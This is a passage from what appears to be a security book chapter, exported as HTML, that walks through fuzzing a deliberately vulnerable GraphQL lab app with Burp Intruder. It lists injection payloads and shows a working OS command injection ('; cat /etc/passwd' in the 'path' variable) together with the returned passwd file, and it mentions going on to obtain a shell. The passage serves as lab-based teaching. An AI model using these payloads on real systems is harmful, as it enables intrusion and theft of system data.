Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;\n&lt;H1&gt;301 Moved&lt;/H1&gt;\nThe document has moved\n&lt;AHREF=\&quot;</span><span class="c4">http://www.google.com</span><span class="c6 c11">/\&quot;&gt;here&lt;/A&gt;.\n&lt;/BODY&gt;&lt;/HTML&gt;\n&quot;}}}</span></p><p class="c9"><span class="c7">I happen to have tested the request by using </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=http://www.google.com/&amp;sa=D&amp;source=editors&amp;ust=1681144520687207&amp;usg=AOvVaw2xD8IWzvUkhfgb5OOaZSpl">http://www.google.com/</a></span><span class="c2">&nbsp;as my URL for importing pastes; you might have a different URL in the request.</span></p><p class="c9"><span class="c2">Now that we have an idea of how GraphQL will respond, let&rsquo;s forward this request to Intruder. Take a closer look at the body of the request:</span></p><p class="c0"><span class="c6 c11">{&quot;query&quot;:&quot;mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\n &nbsp; &nbsp; &nbsp; &nbsp;importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\n</span></p><p class="c10"><span class="c6 c11">result\n &nbsp; &nbsp; &nbsp; &nbsp;}\n &nbsp; &nbsp; &nbsp; &nbsp;}&quot;,&quot;variables&quot;:{&quot;host&quot;:&quot;google.com&quot;,&quot;port&quot;:80,&quot;path&quot;:&quot;/&quot;,&quot;scheme&quot;:&quot;http&quot;}}</span></p><p class="c9"><span class="c7">Notice that this request contains variables, each of which is preceded by </span><span class="c12">$</span><span class="c7">&nbsp;and followed by </span><span class="c12">!</span><span class="c7">. The corresponding keys and values are at the bottom of the request, following </span><span class="c12">&quot;variables&quot;</span><span class="c2">. We&rsquo;ll place our payload positions here, because these values contain user input that could be passed to backend processes, making them an ideal target for fuzzing. If any of these variables lack good input validation controls, we&rsquo;ll be able to detect a vulnerability and potentially exploit the weakness. We&rsquo;ll place our payload positions within this variables section:</span></p><p class="c10"><span class="c6">&quot;variables&quot;:{</span><span class="c4">&quot;host&quot;:&quot;google.com&sect;test&sect;&sect;test2&sect;&quot;</span><span class="c6 c11">,&quot;port&quot;:80,&quot;path&quot;:&quot;/&quot;,&quot;scheme&quot;:&quot;http&quot;}}</span></p><p class="c9"><span class="c2">Next, configure your two payload sets. For the first payload, let&rsquo;s take a sample of metacharacters from Chapter 12:</span></p><p class="c9"><span class="c12 c11">|</span></p><p class="c9"><span class="c12 c11">||</span></p><p class="c9"><span class="c12 c11">&amp;</span></p><p class="c9"><span class="c12 c11">&amp;&amp;</span></p><p class="c9"><span class="c12 c11">&#39;</span></p><p class="c9"><span class="c12 c11">&quot;</span></p><p class="c9"><span class="c12 c11">;</span></p><p class="c9"><span class="c12 c11">&#39;&quot;</span></p><p class="c9"><span class="c2">For the second payload set, let&rsquo;s use a sample of potential injection payloads, also from Chapter 12:</span></p><p class="c9"><span class="c12 c11">whoami</span></p><p class="c9"><span class="c12 c11">{&quot;$where&quot;: &quot;sleep(1000) &quot;}</span></p><p class="c9"><span class="c12 c11">;%00</span></p><p class="c9"><span class="c12 c11">-- -</span></p><p class="c9"><span class="c2">Finally, make sure payload encoding is disabled.</span></p><p class="c9"><span class="c7">Now let&rsquo;s run our attack against the host variable. As you can see in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-14&amp;sa=D&amp;source=editors&amp;ust=1681144520689775&amp;usg=AOvVaw1VsN_yiKqUS_hmpFsRGsD0">Figure 14-14</a></span><span class="c2">, the results are uniform, and there were no anomalies. All the status codes and response lengths were identical.</span></p><p class="c9"><span class="c2">You can review the responses to see what they consisted of, but from this initial scan, there doesn&rsquo;t appear to be anything interesting.</span></p><p class="c9"><span class="c7">Now let&rsquo;s target the </span><span class="c12">&quot;path&quot;</span><span class="c2">&nbsp;variable:</span></p><p class="c10"><span class="c6">&quot;variables&quot;:{&quot;host&quot;:&quot;google.com&quot;,&quot;port&quot;:80,</span><span class="c4">&quot;path&quot;:&quot;/&sect;test&sect;&sect;test2&sect;&quot;</span><span class="c6 c11">,&quot;scheme&quot;:&quot;http&quot;}}</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 434.67px;"><img alt="Screenshot of fuzzing results in Burp Suite showing 200 response codes only" src="images/image5.png" style="width: 624.00px; height: 434.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-14</span><span class="c13">: Intruder results for an attack on the host variable</span></p><p class="c9"><span class="c7">We&rsquo;ll use the same payloads as the first attack. As you can see in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-15&amp;sa=D&amp;source=editors&amp;ust=1681144520691589&amp;usg=AOvVaw0wSuu60RxCd5TkpOgYz0CN">Figure 14-15</a></span><span class="c2">, not only do we receive a variety of response codes and lengths, but we also receive indicators of successful code execution.</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 469.33px;"><img alt="Screenshot of fuzzing results in Burp Suite showing a response body containing data returned from a GraphQL query" src="images/image1.png" style="width: 624.00px; height: 469.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-15</span><span class="c17 c26">: Intruder results for an attack on the </span><span class="c17 c22">&quot;path&quot;</span><span class="c13">&nbsp;variable</span></p><p class="c9"><span class="c7">Digging through the responses, you can see that several of them were susceptible to the </span><span class="c12">whoami</span><span class="c7">&nbsp;command. This suggests that the </span><span class="c12">&quot;path&quot;</span><span class="c7">&nbsp;variable is vulnerable to operating system injection. In addition, the user that the command revealed is the privileged user, </span><span class="c12">root</span><span class="c7">, an indication that the app is running on a Linux host. You can update your second set of payloads to include the Linux commands </span><span class="c12">uname -a</span><span class="c7">&nbsp;and </span><span class="c12">ver</span><span class="c2">&nbsp;to see which operating system you are interacting with.</span></p><p class="c9"><span class="c7">Once you&rsquo;ve discovered the operating system, you can perform more targeted attacks to obtain sensitive information from the system. For example, in the request shown in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23listing14-3&amp;sa=D&amp;source=editors&amp;ust=1681144520693709&amp;usg=AOvVaw2rinvphjJQr29_sShbVPo5">Listing 14-3</a></span><span class="c7">, I&rsquo;ve replaced the </span><span class="c12">&quot;path&quot;</span><span class="c7">&nbsp;variable with </span><span class="c12">/; cat /etc/passwd</span><span class="c7">, which will attempt to make the operating system return the </span><span class="c7 c17">/etc/passwd</span><span class="c7">&nbsp;file containing a list of the accounts on the host system, shown in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23listing14-4&amp;sa=D&amp;source=editors&amp;ust=1681144520694696&amp;usg=AOvVaw1vL4eprjW_hOiE2xz0AxOp">Listing 14-4</a></span><span class="c2">.</span></p><p class="c0"><span class="c6 c11">POST /graphql HTTP/1.1</span></p><p class="c0"><span class="c6 c11">Host: 192.168.195.132:5000</span></p><p class="c0"><span class="c6 c11">Accept: application/json</span></p><p class="c0"><span class="c6 c11">Content-Type: application/json</span></p><p class="c0"><span class="c6 c11">--snip--</span></p><p class="c0 c14"><span class="c6 c11"></span></p><p class="c0"><span class="c6 c11">{&quot;variables&quot;: {&quot;scheme&quot;: &quot;http&quot;,</span></p><p class="c0"><span class="c6">&quot;path&quot;: &quot;/ </span><span class="c4">; cat /etc/passwd&quot;,</span></p><p class="c0"><span class="c6 c11">&quot;port&quot;: 80, &quot;host&quot;: &quot;test.com&quot;},</span></p><p class="c10"><span class="c6 c11">&quot;query&quot;: &quot;mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\n &nbsp; &nbsp; &nbsp; &nbsp;importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\n &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;result\n &nbsp; &nbsp; &nbsp; &nbsp;}\n &nbsp; &nbsp; &nbsp;}&quot;}</span></p><p class="c24"><span class="c20 c17">Listing 14-3</span><span class="c7 c16">: The request</span></p><p class="c0"><span class="c6 c11">HTTP/1.0 200 OK</span></p><p class="c0"><span class="c6 c11">Content-Type: application/json</span></p><p class="c0"><span class="c6 c11">Content-Length: 1516</span></p><p class="c0"><span class="c6 c11">--snip--</span></p><p class="c0 c14"><span class="c6 c11"></span></p><p class="c0"><span class="c6 c11">{&quot;data&quot;:{&quot;importPaste&quot;:{&quot;result&quot;:&quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-//IETF//DTD HTML 2.0//EN\&quot;&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;301 Moved Permanently&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n</span></p><p class="c0"><span class="c6">&lt;h1&gt;Moved Permanently&lt;/h1&gt;\n&lt;p&gt;The document has moved &lt;a href=\&quot;https://test.com/\&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;\n&lt;/body&gt;&lt;/html&gt;\</span><span class="c4">n</span></p><p class="c10"><span class="c4">root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nutmp:x:100:406:utmp:/home/utmp:/bin/false</span><span class="c6 c11">\n&quot;}}}</span></p><p class="c24"><span class="c20 c17">Listing 14-4</span><span class="c7 c16">: The response</span></p><p class="c9"><span class="c2">You now have the ability to execute all commands as the root user within the Linux operating system. Just like that, we&rsquo;re able to inject system commands using a GraphQL API. From here, we could continue to enumerate information using this command injection vulnerability or else use commands to obtain a shell to the system. Either way, this is a very significant finding. Good job exploiting a GraphQL API!</span></p><h2 class="c21" id="h.thv4gt387j8u"><span class="c11 c23">Summary</span></h2><p class="c24"><span class="c2">In this chapter, we walked through an attack of a GraphQL API using some of the techniques covered in this book. GraphQL operates differently than the REST APIs we&rsquo;ve worked with up to this point. However, once we adapted a few things to GraphQL, we were able to apply many of the same techniques to perform some awesome exploits. Don&rsquo;t be intimidated by new API types you might encounter; instead, embrace the tech, learn how it operates, and then experiment with the API attacks you&rsquo;ve already learned.</span></p><p class="c9"><span class="c2">DVGA has several more vulnerabilities we didn&rsquo;t cover in this chapter. I recommend that you return to your lab and exploit them. In the final chapter, I&rsquo;ll present real-world breaches and bounties involving APIs.</span></p><p class="c0 c14"><span class="c11 c30"></span></p></body></html>